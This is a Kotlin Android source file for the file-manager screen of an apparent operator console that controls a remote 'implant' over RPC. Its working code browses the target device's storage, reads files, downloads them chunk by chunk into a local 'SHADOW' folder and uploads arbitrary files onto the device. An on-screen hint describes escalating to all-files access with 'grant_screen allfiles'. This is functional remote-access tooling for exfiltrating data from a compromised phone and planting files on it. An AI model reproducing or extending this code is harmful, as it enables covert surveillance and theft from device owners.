package com.shadow.operator.ui.filemanager

import android.content.ContentValues
import android.os.Build
import android.util.Base64
import android.widget.Toast
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.clickable
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowBack
import androidx.compose.material.icons.filled.Close
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.shadow.operator.data.RpcClient
import com.shadow.operator.ui.theme.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

import java.io.ByteArrayOutputStream

private data class FsEntry(val type: String, val size: Long, val name: String)

/** 256 KiB of raw bytes; base64 inflates it ~1.37x, still well inside RPC limits. */
private const val CHUNK = 256 * 1024

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun FileManagerScreen(
    rpc: RpcClient,
    onNavigateBack: () -> Unit
) {
    val scope = rememberCoroutineScope()
    val context = LocalContext.current
    var currentPath by remember { mutableStateOf("/sdcard") }
    var inputPath by remember { mutableStateOf("/sdcard") }
    var files by remember { mutableStateOf<List<FsEntry>>(emptyList()) }
    var fileContent by remember { mutableStateOf<String?>(null) }
    var loading by remember { mutableStateOf(false) }
    var busy by remember { mutableStateOf(false) }
    var transfer by remember { mutableStateOf<String?>(null) }
    var picked by remember { mutableStateOf<FsEntry?>(null) }

    fun joinPath(name: String) =
        if (currentPath == "/") "/$name" else "$currentPath/$name"

    fun human(e: FsEntry): String = when {
        e.type == "d" -> "DIR"
        e.size >= 1024 * 1024 -> String.format("%.1f MB", e.size / 1048576.0)
        e.size >= 1024 -> String.format("%.1f KB", e.size / 1024.0)
        else -> "${e.size} B"
    }

    fun listFiles(path: String) {
        currentPath = path
        inputPath = path
        fileContent = null
        loading = true
        scope.launch {
            val result = rpc.execute("fs_list", """{"path":"$path"}""", 90000)
            val parsed = result.lineSequence().mapNotNull { line ->
                val parts = line.split("\t")
                if (parts.size >= 3 && (parts[0] == "d" || parts[0] == "f")) {
                    FsEntry(
                        parts[0],
                        parts[1].toLongOrNull() ?: 0L,
                        parts.drop(2).joinToString("\t")
                    )
                } else null
            }.toList()
            files = if (parsed.any { e -> e.name == ".." }) parsed
            else listOf(FsEntry("d", 0L, "..")) + parsed
            loading = false
        }
    }

    fun openAsText(name: String) {
        fileContent = "loading…"
        scope.launch {
            fileContent = rpc.execute("fs_read", """{"path":"${joinPath(name)}"}""", 90000)
        }
    }

    val uploadPicker = rememberLauncherForActivityResult(
        ActivityResultContracts.OpenDocument()
    ) { uri ->
        if (uri == null) return@rememberLauncherForActivityResult
        scope.launch {
            busy = true
            val outcome = try {
                val name = queryDisplayName(context.contentResolver, uri) ?: "upload.bin"
                val bytes = withContext(Dispatchers.IO) {
                    context.contentResolver.openInputStream(uri)?.use { it.readBytes() }
                }
                if (bytes == null) "upload aborted: could not read $name"
                else uploadChunks(rpc, joinPath(name), bytes) { done, total ->
                    transfer = "uploading $name: $done/$total"
                }
            } catch (t: Throwable) {
                "upload failed: ${t.message}"
            }
            transfer = outcome
            busy = false
            listFiles(currentPath)
            Toast.makeText(context, outcome, Toast.LENGTH_LONG).show()
        }
    }

    LaunchedEffect(Unit) { listFiles("/sdcard") }

    Scaffold(
        topBar = {
            TopAppBar(
                title = {
                    Column {
                        Text(
                            "Files",
                            color = TextPrimary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 18.sp
                        )
                        Text(
                            currentPath,
                            color = TextSecondary,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 11.sp
                        )
                    }
                },
                navigationIcon = {
                    IconButton(onClick = {
                        if (fileContent != null) fileContent = null
                        else if (currentPath != "/") {
                            val parent = currentPath.substringBeforeLast("/")
                            listFiles(if (parent.isEmpty()) "/" else parent)
                        } else onNavigateBack()
                    }) {
                        Icon(Icons.Default.ArrowBack, contentDescription = "Back", tint = TextPrimary)
                    }
                },
                actions = {
                    TextButton(
                        enabled = !busy,
                        onClick = { uploadPicker.launch(arrayOf("*/*")) }
                    ) {
                        Text(
                            if (busy) "busy…" else "Upload",
                            color = if (busy) TextSecondary else AccentBlue,
                            fontFamily = FontFamily.Monospace,
                            fontSize = 13.sp
                        )
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = SurfaceDark)
            )
        },
        containerColor = BgBlack
    ) { pad ->
        Column(Modifier.padding(pad).fillMaxSize()) {
            // Path bar: type a path, Go to jump anywhere the implant can read.
            Row(
                Modifier.fillMaxWidth().padding(horizontal = 12.dp, vertical = 8.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Surface(
                    color = SurfaceElevated,
                    modifier = Modifier.weight(1f)
                ) {
                    BasicTextField(
                        value = inputPath,
                        onValueChange = { inputPath = it },
                        singleLine = true,
                        textStyle = TextStyle(
                            color = TextPrimary,
                            fontSize = 12.sp,
                            fontFamily = FontFamily.Monospace
                        ),
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(horizontal = 10.dp, vertical = 9.dp)
                    )
                }
                Spacer(Modifier.width(8.dp))
                Surface(color = SurfaceElevated, modifier = Modifier.clickable {
                    val target = inputPath.trim().ifEmpty { "/" }
                    listFiles(target)
                }) {
                    Text(
                        "Go",
                        color = AccentGreen,
                        fontFamily = FontFamily.Monospace,
                        fontWeight = FontWeight.Bold,
                        fontSize = 13.sp,
                        modifier = Modifier.padding(horizontal = 16.dp, vertical = 9.dp)
                    )
                }
            }

            transfer?.let {
                Text(
                    it,
                    color = AccentBlue,
                    fontFamily = FontFamily.Monospace,
                    fontSize = 11.sp,
                    modifier = Modifier.padding(horizontal = 12.dp, vertical = 2.dp)
                )
            }

            if (fileContent != null) {
                Column(Modifier.fillMaxSize()) {
                    Text(
                        fileContent!!.take(20000),
                        color = TextPrimary,
                        fontFamily = FontFamily.Monospace,
                        fontSize = 11.sp,
                        lineHeight = 16.sp,
                        modifier = Modifier
                            .fillMaxSize()
                            .verticalScroll(rememberScrollState())
                            .padding(12.dp)
                    )
                }
            } else if (loading) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("loading…", color = TextSecondary, fontSize = 12.sp)
                }
            } else if (files.isEmpty()) {
                Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text(
                        "empty or not readable\n(run grant_screen allfiles, then toggle_grant)",
                        color = TextSecondary,
                        fontSize = 12.sp,
                        fontFamily = FontFamily.Monospace
                    )
                }
            } else {
                LazyColumn(Modifier.fillMaxSize()) {
                    items(files) { e ->
                        Row(
                            Modifier
                                .fillMaxWidth()
                                .clickable {
                                    when {
                                        e.name == ".." && currentPath != "/" -> {
                                            val parent = currentPath.substringBeforeLast("/")
                                            listFiles(if (parent.isEmpty()) "/" else parent)
                                        }
                                        e.type == "d" -> listFiles(joinPath(e.name))
                                        else -> picked = e
                                    }
                                }
                                .padding(horizontal = 16.dp, vertical = 10.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                if (e.type == "d") "📁" else "📄",
                                fontSize = 13.sp,
                                modifier = Modifier.padding(end = 10.dp)
                            )
                            Text(
                                e.name,
                                color = if (e.type == "d") AccentBlue else TextPrimary,
                                fontFamily = FontFamily.Monospace,
                                fontSize = 13.sp,
                                modifier = Modifier.weight(1f)
                            )
                            if (e.type != "d") {
                                Text(
                                    human(e),
                                    color = TextSecondary,
                                    fontFamily = FontFamily.Monospace,
                                    fontSize = 11.sp
                                )
                            }
                        }
                    }
                }
            }
        }
    }

    // File action sheet: download works on binaries, "view as text" is lossy.
    picked?.let { e ->
        AlertDialog(
            onDismissRequest = { picked = null },
            containerColor = SurfaceElevated,
            title = {
                Text(e.name, color = TextPrimary, fontSize = 14.sp, fontFamily = FontFamily.Monospace)
            },
            text = {
                Text(
                    "${human(e)}\n${joinPath(e.name)}",
                    color = TextSecondary,
                    fontSize = 12.sp,
                    fontFamily = FontFamily.Monospace
                )
            },
            confirmButton = {
                TextButton(enabled = !busy, onClick = {
                    picked = null
                    scope.launch {
                        busy = true
                        val out = try {
                            downloadChunks(
                                context, rpc, joinPath(e.name), e.name, e.size
                            ) { done, total ->
                                transfer = "downloading ${e.name}: $done/$total"
                            }
                        } catch (t: Throwable) {
                            "download failed: ${t.message}"
                        }
                        transfer = out
                        busy = false
                        Toast.makeText(context, out, Toast.LENGTH_LONG).show()
                    }
                }) {
                    Text("Download", color = AccentGreen, fontFamily = FontFamily.Monospace, fontSize = 13.sp)
                }
            },
            dismissButton = {
                TextButton(onClick = {
                    val n = e.name
                    picked = null
                    openAsText(n)
                }) {
                    Text("View as text", color = AccentBlue, fontFamily = FontFamily.Monospace, fontSize = 13.sp)
                }
            }
        )
    }
}

/**
 * Upload in CHUNK pieces: first chunk truncates, the rest append. Base64 keeps
 * arbitrary bytes safe inside the JSON envelope the RPC queue carries.
 */
private suspend fun uploadChunks(
    rpc: RpcClient,
    remotePath: String,
    bytes: ByteArray,
    progress: (Long, Long) -> Unit
): String {
    val total = bytes.size.toLong()
    var offset = 0
    var part = 0
    while (offset < bytes.size) {
        val end = minOf(offset + CHUNK, bytes.size)
        val payload = com.google.gson.JsonObject().apply {
            addProperty("path", remotePath)
            addProperty("b64", Base64.encodeToString(bytes.copyOfRange(offset, end), Base64.NO_WRAP))
            addProperty("append", part > 0)
        }.toString()
        val res = rpc.execute("fs_write_b64", payload, 90000)
        if (res.startsWith("fs error") || res.startsWith("b64 decode error") || res.startsWith("ERROR")) {
            return "upload failed at offset $offset: ${res.take(160)}"
        }
        offset = end
        part++
        progress(offset.toLong(), total)
    }
    return "uploaded $total bytes → $remotePath ($part chunks)"
}

/** Download via chunked fs_read_b64, then store where the user can find it. */
private suspend fun downloadChunks(
    context: android.content.Context,
    rpc: RpcClient,
    remotePath: String,
    name: String,
    size: Long,
    progress: (Long, Long) -> Unit
): String {
    val out = ByteArrayOutputStream()
    var offset = 0L
    var guard = 0
    while (true) {
        // 4000 chunks = ~1 GB; a runaway loop here would otherwise hang the UI.
        if (++guard > 4000) return "aborted after $guard chunks"
        val payload = """{"path":"$remotePath","offset":$offset,"len":$CHUNK}"""
        val res = rpc.execute("fs_read_b64", payload, 90000)
        val obj = try {
            com.google.gson.JsonParser.parseString(res).asJsonObject
        } catch (t: Throwable) {
            return "download failed: ${res.take(160)}"
        }
        if (obj.has("error")) return "download failed: ${obj.get("error").asString}"
        val b64 = if (obj.has("b64")) obj.get("b64").asString else ""
        if (b64.isNotEmpty()) out.write(Base64.decode(b64, Base64.NO_WRAP))
        offset += CHUNK
        progress(minOf(offset, size), size)
        if (obj.has("eof") && obj.get("eof").asBoolean) break
    }
    return saveToDownloads(context, name, out.toByteArray())
}

/** MediaStore Downloads on Q+, app external dir below that. */
private fun saveToDownloads(
    context: android.content.Context,
    name: String,
    bytes: ByteArray
): String {
    return try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val values = ContentValues().apply {
                put(android.provider.MediaStore.Downloads.DISPLAY_NAME, name)
                put(android.provider.MediaStore.Downloads.SIZE, bytes.size.toLong())
                put(android.provider.MediaStore.Downloads.MIME_TYPE, "application/octet-stream")
                put(
                    android.provider.MediaStore.Downloads.RELATIVE_PATH,
                    android.os.Environment.DIRECTORY_DOWNLOADS + "/SHADOW"
                )
            }
            val uri = context.contentResolver.insert(
                android.provider.MediaStore.Downloads.EXTERNAL_CONTENT_URI, values
            ) ?: return "could not insert into Downloads"
            context.contentResolver.openOutputStream(uri)?.use { it.write(bytes) }
                ?: return "could not open Downloads output stream"
            "saved ${bytes.size} bytes → Downloads/SHADOW/$name"
        } else {
            val dir = context.getExternalFilesDir(android.os.Environment.DIRECTORY_DOWNLOADS)
                ?: context.filesDir
            val f = java.io.File(dir, name)
            f.writeBytes(bytes)
            "saved ${bytes.size} bytes → ${f.absolutePath}"
        }
    } catch (t: Throwable) {
        "save failed: ${t.message}"
    }
}

private fun queryDisplayName(
    resolver: android.content.ContentResolver,
    uri: android.net.Uri
): String? {
    if (uri.scheme != "content") return uri.lastPathSegment
    return try {
        resolver.query(uri, null, null, null, null)?.use { c ->
            val i = c.getColumnIndex(android.provider.OpenableColumns.DISPLAY_NAME)
            if (i >= 0 && c.moveToFirst()) c.getString(i) else uri.lastPathSegment
        }
    } catch (t: Throwable) {
        uri.lastPathSegment
    }
}
